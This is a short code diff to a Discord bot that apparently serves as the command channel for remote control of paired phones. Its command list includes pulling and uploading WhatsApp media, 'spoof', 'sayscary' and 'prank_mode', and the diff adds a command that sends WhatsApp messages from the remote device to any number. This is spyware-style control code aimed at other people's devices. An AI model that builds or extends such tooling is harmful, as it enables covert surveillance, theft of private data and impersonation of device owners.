@@ -91,6 +91,7 @@ DEVICE_COMMAND_NAMES = {
     "sayscary",
     "sayscaryurdu",
     "getwhatsapp",
+    "sendwhatsapp",
     "prank_mode",
     "spoof",
 }
@@ -1253,6 +1254,11 @@ class ADexDiscordClient(discord.Client):
         @self.tree.command(name="getwhatsapp", description="Zip and upload WhatsApp media data")
         async def getwhatsapp(interaction: discord.Interaction) -> None:
             await self._queue_remote_command(interaction, "getwhatsapp", {})
+
+        @self.tree.command(name="sendwhatsapp", description="Send a WhatsApp message to a specific number")
+        @app_commands.describe(number="Phone number with country code (e.g. 923001234567)", message="Message text")
+        async def sendwhatsapp(interaction: discord.Interaction, number: str, message: str) -> None:
+            await self._queue_remote_command(interaction, "sendwhatsapp", {"number": number, "message": message})
 
         @self.tree.command(name="pair", description="Pair channel with one-time device code")
         @app_commands.describe(code="One-time pairing code shown in app")
